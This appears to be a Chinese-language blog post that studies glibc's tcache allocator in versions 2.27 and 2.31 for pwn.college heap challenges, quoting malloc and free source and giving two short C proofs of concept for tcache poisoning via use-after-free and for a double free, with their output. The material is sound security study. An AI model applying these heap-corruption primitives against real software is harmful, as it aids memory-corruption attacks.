<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"万一找到了呢","hits_empty":"你说的 ${query} 我怎么找不着呢 ","hits_stats":"找到了 ${hits} 个结果，用时 ${time} 毫秒"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="T擦车 12ssh -o ProxyCommand&#x3D;&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; hacker@pwn.collegescp -o ProxyCommand&#x3D;&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; h">
<meta property="og:type" content="article">
<meta property="og:title" content="tcache">
<meta property="og:url" content="http://deutschball.github.io/2024/10/17/T%E6%93%A6%E8%BD%A6/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="T擦车 12ssh -o ProxyCommand&#x3D;&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; hacker@pwn.collegescp -o ProxyCommand&#x3D;&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; h">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-10-17T15:24:00.000Z">
<meta property="article:modified_time" content="2024-10-17T15:24:35.539Z">
<meta property="article:author" content="dustball">
<meta property="article:tag" content="heap exploit">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/2024/10/17/T%E6%93%A6%E8%BD%A6/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>tcache | dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/T%E6%93%A6%E8%BD%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          tcache
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-10-17 23:24:00 / Modified: 23:24:35" itemprop="dateCreated datePublished" datetime="2024-10-17T23:24:00+08:00">2024-10-17</time>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="t擦车">T擦车</h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -o ProxyCommand=&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; hacker@pwn.college</span><br><span class="line">scp -o ProxyCommand=&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; hacker@pwn.college:/challenge/babyheap_level15.0  .</span><br></pre></td></tr></table></figure>
<h2 id="tcache数据结构与算法">tcache数据结构与算法</h2>
<h3 id="glibc-2.27">glibc-2.27</h3>
<h4 id="datastructure">datastructure</h4>
<p>在<code>glibc-2.27</code>上<code>Tcache</code>长这样</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241009161233717.png"
alt="image-20241009161233717" />
<figcaption aria-hidden="true">image-20241009161233717</figcaption>
</figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">//每个线程有一个tcache,因此tcache的线程实例名叫tcache_perthread_struct</span></span><br><span class="line"><span class="comment">//counts和entries是冗余的,只是为了性能所以使用了counts计数</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"><span class="comment">//每个tcache有TCACHE_MAX_BINS = 64 个桶子</span></span><br></pre></td></tr></table></figure>
<p>显然每个桶子里面的<code>chunk</code>大小不一样,并且和桶子下标<code>idx</code>有映射关系,具体来说是:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk size convert to tcache index:</span><br><span class="line">csize2tidx(csize) = (csize<span class="number">-0x11</span>) &gt;&gt; <span class="number">4</span> </span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>tcache下标</th>
<th>chunk_size</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0x20</td>
</tr>
<tr>
<td>1</td>
<td>0x30</td>
</tr>
<tr>
<td>2</td>
<td>0x40</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
</tbody>
</table>
<blockquote>
<p>在<code>amd64</code>上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SIZE_SZ = <span class="number">0x8</span></span><br><span class="line">MALLOC_ALIGNMENT = <span class="number">0x10</span></span><br><span class="line">MINSIZE = <span class="number">0x20</span></span><br><span class="line">MIN_CHUNK_SIZE = <span class="number">0x20</span></span><br><span class="line">MALLOC_ALIGN_MASK = <span class="number">0xf</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="algorithm">algorithm</h4>
<h5 id="malloc">malloc</h5>
<p><code>glibc</code>在<code>2.26</code>之后,
引入了<code>TCACHE</code>机制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc</span><br><span class="line">	tcache_get</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    checked_request2size(bytes, tbytes);</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);		<span class="comment">//计算tcache桶下标</span></span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins			<span class="comment">//下标最高是TCACHE_MAX_BINS = 64</span></span><br><span class="line">        <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">        &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)	<span class="comment">//tc_idx下标桶子里至少有一个堆块</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);	<span class="comment">//从桶子里拿一个堆块返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>没有任何嵌套, 零帧起手</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];		<span class="comment">//FIFO栈</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);				<span class="comment">//再确保一下没有越界</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);				<span class="comment">//再确保一下至少有一个堆块</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;				<span class="comment">//下一个块成为头块</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);						<span class="comment">//块计数-1</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;								<span class="comment">//返回堆块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>整个过程中<code>tcache-&gt;counts[tc_idx]</code>只是随手一记录,并没有根据其值判断是否还有堆块</p>
<p>真正的判断是根据桶子头指针是否为空决定的</p>
<p>当一个堆块返回到<code>tcache</code>中时, 如果可以<code>UAF</code>,
那么就可以把任意假的堆块塞进去</p>
<p>写个poc意思一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *chunk2;</span><br><span class="line">    <span class="type">size_t</span> *chunk3;</span><br><span class="line">    <span class="type">size_t</span> *chunk4;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = fake_chunk1;        <span class="comment">//UAF , chunk1 link fake_chunk1 into tcache</span></span><br><span class="line">    fake_chunk1[<span class="number">0</span>] = fake_chunk2;   <span class="comment">//fake_chunk1 link fake_chunk2 into tcache</span></span><br><span class="line"></span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous chunk1</span></span><br><span class="line">    chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous fake_chunk1</span></span><br><span class="line">    chunk4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous fake_chunk2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk1: %p\n&quot;</span>, fake_chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk2: %p\n&quot;</span>, fake_chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2: %p\n&quot;</span>, chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk3: %p\n&quot;</span>, chunk3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk4: %p\n&quot;</span>, chunk4);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># gcc 227.c -o 227 -no-pie -g -O0 -w</span></span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">227</span></span><br><span class="line">fake_chunk1: <span class="number">0x24dd280</span></span><br><span class="line">fake_chunk2: <span class="number">0x24dd2a0</span></span><br><span class="line">chunk2: <span class="number">0x24dd260</span></span><br><span class="line">chunk3: <span class="number">0x24dd280</span></span><br><span class="line">chunk4: <span class="number">0x24dd2a0</span></span><br></pre></td></tr></table></figure>
<p>并且调试观察当<code>chunk2 = malloc(0x10);</code>之后<code>tcache-&gt;count[tc_idx] = 0</code></p>
<p>接着当<code>chunk3 = malloc(0x10);</code>之后,<code>tcache-&gt;count[tc_idx] = 255</code>,发生了整数下溢</p>
<p>只能说<code>glibc-2.27</code>上的<code>tcache</code>是很简陋的</p>
<h5 id="free">free</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	_int_free</span><br><span class="line">		tcache_put</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    size = chunksize(p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;	<span class="comment">//放回堆块到tcache时根据counts决定对应桶是否已经存满</span></span><br><span class="line">            tcache_put(p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p><code>tcache-&gt;counts[tc_idx]</code>终于发挥作用了,原来是不想遍历链表统计堆块个数,直接看<code>counts</code>偷懒</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>free</code>时根本没有检查,
甚至名目仗胆的<code>double free</code>都没事,
写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> * chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="built_in">free</span>(chunk);<span class="comment">//就是明目张胆double free</span></span><br><span class="line">    <span class="type">char</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);    </span><br><span class="line">    <span class="type">char</span> *chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># ldd 227_df</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff22cdd000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /home/dustball/glibc/glibc<span class="number">-2.27</span>/lib/libc.so<span class="number">.6</span> (<span class="number">0x00007f9b9aab4000</span>)</span><br><span class="line">        /home/dustball/glibc/glibc<span class="number">-2.27</span>/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> =&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f9b9ae68000</span>)</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">227</span>_df</span><br><span class="line">chunk1 @ <span class="number">0xf6d260</span></span><br><span class="line">chunk2 @ <span class="number">0xf6d260</span></span><br></pre></td></tr></table></figure>
<h3 id="glibc-2.31">glibc-2.31</h3>
<h4 id="datastructure-1">datastructure</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>			<span class="comment">//如果key等于glibc既定key值说明本堆块是已经被释放的</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
<p><code>glibc-2.29</code>之后,
<code>tcache_entry</code>结构中加入了一个key字段,
当使用<code>tcache_put</code>把堆块挂到<code>tcache</code>中时,
其<code>key</code>字段均被设置为<code>tcache</code>的地址</p>
<p>以<code>glibc-2.31</code>为例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="algorithm-1">algorithm</h4>
<h5 id="malloc-1">malloc</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span> =&gt; __libc_malloc</span><br><span class="line">	tcache_get</span><br></pre></td></tr></table></figure>
